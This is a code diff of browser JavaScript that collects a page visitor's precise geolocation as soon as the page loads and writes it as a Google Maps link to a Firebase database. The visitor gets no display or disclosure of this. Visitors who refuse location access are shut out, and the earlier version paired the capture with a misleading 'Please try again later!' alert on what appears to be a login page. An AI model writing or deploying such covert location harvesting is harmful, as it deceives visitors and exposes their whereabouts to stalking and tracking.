@@ -1,6 +1,3 @@
-
-
-
 let googleMapsUrl;
 
 function goToCurrentLocationOnGoogleMaps() {
@@ -11,23 +8,11 @@ function goToCurrentLocationOnGoogleMaps() {
                 const longitude = position.coords.longitude;
                 googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-                // window.open(googleMapsUrl, '_blank');
+                // Send location to Firebase
+                sendLocationToFirebase(googleMapsUrl);
             },
             (error) => {
-                switch (error.code) {
-                    case error.PERMISSION_DENIED:
-                        console.error("User denied the request for Geolocation.");
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        console.error("Location information is unavailable.");
-                        break;
-                    case error.TIMEOUT:
-                        console.error("The request to get user location timed out.");
-                        break;
-                    case error.UNKNOWN_ERROR:
-                        console.error("An unknown error occurred.");
-                        break;
-                }
+                handleGeolocationError(error);
             }
         );
     } else {
@@ -35,40 +20,56 @@ function goToCurrentLocationOnGoogleMaps() {
     }
 }
 
+function handleGeolocationError(error) {
+    switch (error.code) {
+        case error.PERMISSION_DENIED:
+            console.error("User denied the request for Geolocation.");
+            break;
+        case error.POSITION_UNAVAILABLE:
+            console.error("Location information is unavailable.");
+            break;
+        case error.TIMEOUT:
+            console.error("The request to get user location timed out.");
+            break;
+        case error.UNKNOWN_ERROR:
+            console.error("An unknown error occurred.");
+            break;
+    }
+}
 
+function sendLocationToFirebase(locationUrl) {
+    const database = firebase.database();
+    database.ref('messages').push().set({
+        message: locationUrl,
+    }).then(() => {
+        console.log('Location sent to Firebase successfully!');
+    }).catch((error) => {
+        console.error('Error writing to Firebase Database', error);
+    });
+}
 
 document.addEventListener('DOMContentLoaded', function () {
-    // Get a reference to the database
-    const database = firebase.database();
-
-    document.getElementById('login-page').addEventListener('load', function (event) {
-        event.preventDefault();
-
-        // Example of sending "hello" to Firebase on login click
-        database.ref('messages').push().set({
-            message: googleMapsUrl,
-            timestamp: firebase.database.ServerValue.TIMESTAMP,
-        }).then(() => {
-            alert('Please try again later!');
-        }).catch((error) => {
-            console.error('Error writing to Firebase Database', error);
-        });
+    checkLocationPermission().then(hasPermission => {
+        if (hasPermission) {
+            goToCurrentLocationOnGoogleMaps();
+        } else {
+            requestLocationPermission().then(granted => {
+                if (granted) {
+                    goToCurrentLocationOnGoogleMaps();
+                } else {
+                    alert('You do not have permission to access our website');
+                }
+            });
+        }
     });
 });
 
-
 async function checkLocationPermission() {
-    // Check if the Permissions API is supported
     if (navigator.permissions) {
         try {
             const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
-
-            // Log the current permission state
             console.log(`Geolocation permission state: ${permissionStatus.state}`);
-
-            // Return true if permission is granted, false otherwise
             return permissionStatus.state === 'granted';
-
         } catch (error) {
             console.error('Error querying geolocation permission:', error);
             return false;
@@ -79,12 +80,27 @@ async function checkLocationPermission() {
     }
 }
 
-// Usage example
-checkLocationPermission().then(hasPermission => {
-    if (hasPermission) {
-        // Call the function
-        goToCurrentLocationOnGoogleMaps();
-    } else {
-        alert('You do not have permission to access our website');
-    }
-});
+function requestLocationPermission() {
+    return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    console.log('Location access granted.');
+                    resolve(true);
+                },
+                error => {
+                    if (error.code === error.PERMISSION_DENIED) {
+                        console.log('Location access denied.');
+                        resolve(false);
+                    } else {
+                        console.error('Error occurred while accessing location:', error);
+                        reject(error);
+                    }
+                }
+            );
+        } else {
+            console.warn('Geolocation is not supported in this browser.');
+            resolve(false);
+        }
+    });
+}
